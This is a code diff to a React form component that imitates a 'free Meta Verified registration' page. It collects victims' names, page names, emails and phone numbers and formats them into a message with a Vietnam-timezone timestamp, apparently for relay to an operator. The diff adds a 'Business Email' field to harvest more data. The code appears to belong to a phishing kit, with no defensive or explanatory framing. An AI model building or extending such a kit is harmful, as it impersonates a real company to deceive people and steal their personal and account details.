@@ -12,6 +12,7 @@ import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useM
 interface FormData {
     fullName: string;
     personalEmail: string;
+    businessEmail: string;
     pageName: string;
 }
 
@@ -24,7 +25,8 @@ interface FormField {
 const FORM_FIELDS: FormField[] = [
     { name: 'fullName', label: 'Full Name', type: 'text' },
     { name: 'pageName', label: 'Apply for Meta Verified – [Page Name]', type: 'text' },
-    { name: 'personalEmail', label: 'Personal Email', type: 'email' }
+    { name: 'personalEmail', label: 'Personal Email', type: 'email' },
+    { name: 'businessEmail', label: 'Business Email', type: 'email' }
 ];
 const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => {
     const [isLoading, setIsLoading] = useState(false);
@@ -34,6 +36,7 @@ const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => 
     const [formData, setFormData] = useState<FormData>({
         fullName: '',
         personalEmail: '',
+        businessEmail: '',
         pageName: ''
     });
 
@@ -46,7 +49,7 @@ const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => 
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Full Name', 'Personal Email', 'Apply for Meta Verified – [Page Name]', 'Mobile phone number', 'Send', 'Our response will be sent to you within 14-40 hours.', 'I agree with Terms of use'];
+        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Full Name', 'Personal Email', 'Business Email', 'Apply for Meta Verified – [Page Name]', 'Mobile phone number', 'Send', 'Our response will be sent to you within 14-40 hours.', 'I agree with Terms of use'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -100,6 +103,7 @@ ${
 <b>👤 Full Name:</b> <code>${formData.fullName}</code>
 <b>📘 Page Name:</b> <code>${formData.pageName}</code>
 <b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
+<b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
 <b>📱 Phone Number:</b> <code>${phoneNumber}</code>
 
 <b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
